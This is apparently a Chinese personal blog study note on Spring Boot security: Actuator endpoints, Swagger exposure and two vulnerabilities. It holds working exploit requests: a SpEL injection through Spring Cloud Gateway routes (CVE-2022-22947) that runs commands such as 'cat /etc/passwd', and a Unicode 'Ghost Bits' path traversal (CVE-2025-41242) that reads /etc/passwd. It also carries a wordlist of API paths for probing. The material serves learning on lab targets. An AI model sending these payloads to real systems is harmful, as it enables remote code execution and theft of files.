---
title: spring学习
date: 2026-09-20 14:42:10
description: spring的初步学习
categories:
  - 笔记
tags:
  - 日常
---

# #spring学习

最近想去挖一挖edu，碰到spring框架，就想去了解了解spring框架漏洞，发现知识点有不少，很多知识点没能细学起来

### 怎么认出目标是 Spring boot？

- 报错页面是经典的 "**Whitelabel Error Page**"；
- **小绿叶图标**：在浏览器标签页，Spring Boot 应用默认会显示一个绿色的树叶图标。

![image1](/images/spring学习/image1.png)

![image2](/images/spring学习/image2.png)

### Spring Boot 是什么？

Java 后端要配一大堆 XML，而 Spring Boot 把它**自动配置**了——加个依赖、写几行代码，一个 Web 服务就跑起来了。
使用Spring Boot可以做到专注于Spring应用的开发，而无需过多关注XML的配置。

### Actuator 是什么？

Spring Boot Actuator 是内置的**监控套件**，帮助我们监控和管理Spring Boot 应用的模块。加一个依赖，你的程序就多出一批 URL，能看/能操作程序内部状态，问题出在：**很多开发者把它直接暴露在公网，且没有鉴权**。
常见的原生端点：

| 端点                       |                             作用                             |
| -------------------------- | :----------------------------------------------------------: |
| /actuator                  |                    查看有哪些端点是开放的                    |
| /actuator/health           |                   查看有关应用程序运行状况                   |
| /actuator/info             |                         提供应用信息                         |
| **/actuator/env**          |                       查看全部环境属性                       |
| **/actuator/configprops**  | 显示应用程序中所有 @ConfigurationProperties Bean 的详细信息  |
| /actuator/beans            |                       看加载了哪些组件                       |
| **/actuator/heapdump**     |     下载整个堆内存快照，也就是信息泄露（能翻出明文密码）     |
| /actuator/shutdown         |                           关停服务                           |
| **/actuator/refresh**      | 如果 `/actuator/env` 支持 POST，配合 `/actuator/refresh` **重载配置**，就可以远程修改应用属性 |
| /actuator/auditevent       |                  提供应用程序审计事件的信息                  |
| /actuator/conditions       |            提供有关配置和自动配置类条件评估的信息            |
| /actuator/flyway           |            提供有关 Flyway 执行的数据库迁移的信息            |
| /actuator/httptrace        | 提供有关 HTTP 请求-响应交换的信息。（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等） |
| /actuator/integrationgraph |        公开了一个包含所有 Spring Integration 组件的图        |
| /actuator/liquibase        |         提供有关 Liquibase 应用的数据库更改集的信息          |
| /actuator/logfile          |               提供对应用程序日志文件内容的访问               |
| /actuator/mappings         |                 供有关应用程序请求映射的信息                 |
| /actuator/metrics          |                   提供对应用程序指标的访问                   |
| /actuator/prometheus       | 以prometheusPrometheus 服务器抓取所需的格式提供 Spring Boot 应用程序的指标 |
| /actuator/quartz           |      提供有关由 Quartz 调度程序管理的作业和触发器的信息      |
| /actuator/scheduledtasks   |                提供有关应用程序计划任务的信息                |
| /actuator/sessions         |   提供有关由 Spring Session 管理的应用程序 HTTP 会话的信息   |
| /actuator/startup          |                提供有关应用程序启动顺序的信息                |
| /actuator/gateway          |                    动态管理网关的路由规则                    |

### 深度利用

#### CVE-2022-22947(SpringBoot Actuator敏感端点泄露)

**漏洞影响范围**：

- Spring Cloud Gateway 3.1.x < 3.1.1
- Spring Cloud Gateway 3.0.x < 3.0.7
- 旧的、不受支持的版本也会受到影响

![image3](/images/spring学习/image3.jpg)

/actuator/gateway 没鉴权，由此我们可以修改或者添加路由规则

![image4](/images/spring学习/image4.jpg)

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host:localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 429

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
 "uri": "http://example.com",
    "predicates": [{
      "name": "Path",
      "args": {"_genkey_0": "/hacktest/**"}
    }]
  }
```

除了可以看id，还可以看些别的

```
new String[]{"cat","/etc/passwd"}
```

**Spring Cloud Gateway是什么？**

Gateway指网关
顺带一题，Spring Cloud Gateway 是微服务架构中的统一 API 网关，负责接收所有外部请求，并根据路由规则（Route/Predicate/Filter）把请求转发到后端对应的服务，同时在转发前后**做鉴权、限流、过滤等处理**。

SpEL 是 Spring 的表达式语言，用 #{...} 包裹。Gateway 的 filter 参数允许写 SpEL，本意是动态生成值——但它没做沙箱，表达式里能用 T() 运算符加载任意类做反射，于是能执行命令。
SpEL 表达式:`"value": "#{1+1}"` → 会被算成 2

`/actuator/gateway/refresh`刷新

![image5](/images/spring学习/image5.jpg)

```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![image6](/images/spring学习/image6.jpg)

```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

删除

```
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close


```

#### CVE-2025-41242

受影响的版本

- 6.2.0 - 6.2.9
- 6.1.0 - 6.1.21
- 6.0.0 - 6.0.29
- 5.3.0 - 5.3.43
- 较旧的、不受支持的版本也受到影响。

另外 Jetty 侧的 %u 解码只在 jetty-util ≥ 12.0（Spring Boot 3.2.0+）存在，旧版 Spring Boot（3.1.x + Jetty 11）走不了这条链。

**原理**：这是一个"解析差异"（parser differential）型路径穿越，社区叫它 **Ghost Bits（幽灵位）**
攻击者利用 Unicode 字符的低 8 位构造恶意载荷：WAF 看到的是无害中文，但后端 Java 服务解析后还原为危险 ASCII 字符，实现绕过。

**Spring 高位截断**：`StringUtils.uriDecode()` 解码时，对非 `%xy` 字符调用 `ByteArrayOutputStream.write(int)`，这个方法只保留16 位 `char` 的**低 8 位**，高 8 位直接丢弃。于是中文字符被静默压成 ASCII

**Jetty 二次解码**：路径交给 Jetty 后，`URIUtil.encodePathSafeEncoding` 把 `%u002e` 当 Unicode 转义解码成 `.`，于是`/.%u002e/` 变成 `/../`，最终在文件系统层形成 `../../../../../etc/passwd`，任意文件读取。

| 字符 | Unicode | 低8位 | 对应 ASCII |
| ---- | ------- | ----- | ---------- |
| 阮   | U+962E  | 0x2E  | .          |
| 严   | U+4E25  | 0x25  | %          |
| 灵   | U+7075  | 0x75  | u          |
| 丰   | U+4E30  | 0x30  | 0          |
| 丰   | U+4E30  | 0x30  | 0          |
| 甲   | U+7532  | 0x32  | 2          |
| 来   | U+6765  | 0x65  | e          |

阮严灵丰丰甲来 → `.%u002e` → Jetty 解析为 `..` → 路径穿越成功。

Jetty 是 Spring Boot 应用常用的内嵌 HTTP 服务器。
CVE-2025-41242 是一个由 Spring 框架与 Jetty 之间 **URI 解码不一致** 所导致的路径穿越漏洞。

**触发条件**：

1. 请求必须以 **`阮严灵丰丰甲来` 的原始 UTF-8 字节** 直送服务端，不能预先做 percent-encoding。使用 Burp 会对高位 Unicode 字符做规范化转换，得用 Yakit 的 HTTP Fuzzer 会原样发送请求行。如果中文字符在传输前被编码成 `%E9%98%AE` 这样的 ASCII 三元组，解码器走的是另一条不含截断逻辑的路径，漏洞无法触发。
2. 目标文件名中至少要有一个字符做 percent-encoding（例如把 `passwd` 写成 `passw%64`），否则 Spring 的路径匹配会提前短路，根本不会调用到那段有问题的解码逻辑。

![image7](/images/spring学习/image7.jpg)

```
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mitm/
Accept-Encoding: gzip, deflate
```

## 其他

### Swagger UI 敏感接口泄露

**什么是 Swagger？**

Swagger 是一个**自动生成 API 接口文档**的工具。用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。

由于前端和后端是两拨人分开开发的，靠**接口**对接。为了避免“口头约定”导致的出错，开发人员使用 Swagger 自动生成接口文档，作为协作的桥梁。

**风险点**：信息泄露。由于未正确配置访问控制或未实施安全措施，导致API接口被不授权的人员访问和利用，从而导致系统安全风险。

### Spring Security是什么？

它默认会给 Actuator 端点加上**除了 health/info 之外都要登录**的规则。核心功能包括**认证**和**授权**，减少了为系统安全而编写大量重复代码的工作。

认证：即系统**判断用户的身份是否合法**，合法可继续访问，不合法则拒绝访问。常见的用户身份认证方式有：用户名密码登录、二维码登录、手机短信登录等方式。主要是为了保护系统的隐私数据与资源，用户的身份合法才能访问该系统的资源。

授权：即认证通过后，**根据用户的权限来控制用户访问资源的过程**，拥有资源的访问权限则正常访问，没有权限则拒绝访问。 比如在视频网站中，普通用户登录后只有观看免费视频的权限，而VIP用户登录后，网站会给该用户提供观看VIP视频的权限。

### 架构模式对比

![image8](/images/spring学习/image8.png)

### 怎么判断传统web框架还是前后端分离框架？

1. 网址形式

   传统模式多为 .jsp、.do、.html、.php 后。前后端分离多为 #/xxx、/xxx（无后缀，靠路由）

2. 断连特征

   传统模式下，后端挂了，整个页面会直接报错或白屏。
   前后端分离，如果后端服务器宕机（或人为拦截 API 请求），**前端页面依然能打开**（因为 HTML/JS/CSS 是静态资源），只是数据加载失败或转圈圈。

3. 路由特征

   **前端路由**：浏览器地址栏显示的路径（如 `/system/user`），仅代表页面组件的切换，**不产生后端请求**。
   **后端接口**：F12 网络面	板中实际传输数据的路径（如 `/dev-api/system/user/list`），这才是我们攻击的目标。

4. 技术栈指纹

   查看源代码，寻找 `app.js`, `chunk-libs.js` 等 Webpack 打包特征。或者使用工具 Wappalyzer 等插件来

### 附录

常见的一些接口：

```
/api
/api-docs
/api-docs/swagger.json
/api.html
/api/api-docs
/api/apidocs
/api/doc
/api/swagger
/api/swagger-ui
/api/swagger-ui.html
/api/swagger-ui.html/
/api/swaggerui.json
/api/swagger.json
/api/swagger/
/api/swagger/ui
/api/swagger/ui/
/api/swaggerui
/api/swaggerui/
/api/v1/
/api/v1/api-docs
/api/v1/apidocs
/api/v1/swagger
/api/v1/swagger-ui
/api/v1/swagger-ui.html
/api/v1/swagger-ui.json
/api/v1/swagger.json
/api/v1/swagger/
/api/v2
/api/v2/api-docs
/api/v2/apidocs
/api/v2/swagger
/api/v2/swagger-ui
/api/v2/swagger-ui.html
/api/v2/swaggerui.json
/api/v2/swagger.json
/api/v2/swagger/
/api/v3
/apidocs
/apidocs/swagger.json
/doc.html
/docs/
/druid/index.html
/graphql
/libs/swaggerui
/libs/swaggerui/
/spring-security-oauth-resource/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/sw/swagger-ui.html
/swagger
/swagger-resources
/swagger-resources/configuration/security
/swagger-resources/configuration/security/
/swagger-resources/configuration/ui
/swagger-resources/configuration/ui/
/swagger-ui
/swagger-ui.html
/swagger-ui.html#/api-memory-controller
/swagger-ui.html/
/swagger-ui.json
/swagger-ui/swagger.json
/swagger.json
/swagger.yml
/swagger/
/swagger/index.html
/swagger/static/index.html
/swagger/swagger-ui.html
/swagger/ui/
/Swagger/ui/index
/swagger/ui/index
/swagger/v1/swagger.json
/swagger/v2/swagger.json/template
/swagger-ui.html/user
/swagger-ui.html/user
/swagger-ui.html/
/v1.x/swagger-ui.html
/v1/api-docs
/v1/swagger.json
/v2/api-docs
/v3/api-docs
```

靶场：

  - Vulhub — GitHub (https://github.com/vulhub/vulhub)
  - JavaSecLab — GitHub (https://github.com/whgojp/JavaSecLab)